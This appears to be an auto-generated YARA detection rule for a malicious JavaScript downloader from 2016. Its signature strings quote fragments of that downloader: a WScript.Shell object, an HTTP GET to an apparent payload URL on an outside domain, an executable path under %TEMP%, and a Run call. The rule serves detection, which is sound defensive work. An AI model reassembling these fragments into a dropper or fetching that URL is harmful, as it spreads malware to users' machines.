rule sig_20160328_76a6935c2ed7f13b7fcea8d21e21ff72 {
  meta:
    description = "datamaliciousorder - file 20160328_76a6935c2ed7f13b7fcea8d21e21ff72.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fdbd68dcb5bb915c0f5a8568eb3cebbd41feb3563508ef06db632dcfd11b75c1"

  strings:
    $s1  = "function Xghmsrehzp() {return Qbtvux[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xx09dlR9i.exe\";};" fullword ascii
    $s2  = "Badcfit[Oguowdwz](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Mgzoetcn](Aaoogqg() * 11)} while (Badcfit[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Lnyqrxbjhg(Lloovbjfn, Ycrzu){return Lloovbjfn - Ycrzu;};" fullword ascii
    $s5  = "var Qbtvux = function Apibhpknld() {return WScript[Gztjqqezhy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hdagtzxeyh(Jawbsnh){Qbtvux[\"Run\"](Jawbsnh, Ymplzwr, Ymplzwr);};" fullword ascii
    $s7  = "function Ajxaqbscun() {return ((Dilqthsv == true) && (Dilqthsv == Ugrit)) ? 1 : Ymplzwr;};" fullword ascii
    $s8  = "function Zvtsejam(Thqpac) {var Xrmbyu = (1, 2, 3, 4, 5, Thqpac); return Xrmbyu;};" fullword ascii
    $s9  = "Dilqthsv = true; " fullword ascii
    $s10 = "var Dqomc = new this[\"Date\"]();" fullword ascii
    $s11 = "var Ugrit = false;" fullword ascii
    $s12 = "Ugrit = true; " fullword ascii
    $s13 = "var Dilqthsv = false;" fullword ascii
    $s14 = "function Vvkfyvmgs(){return Ivruwaz;};" fullword ascii
    $s15 = "function Aaoogqg(){return 22;};" fullword ascii
    $s16 = "function Rddiahsjre(){return Gztjqqezhy;};" fullword ascii
    $s17 = " while (Banutopxic){" fullword ascii
    $s18 = "var Qdeuhhrqa = false;" fullword ascii
    $s19 = "function Ydwfcowbcv()" fullword ascii
    $s20 = "} catch(Rgbzxno){Banutopxic = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}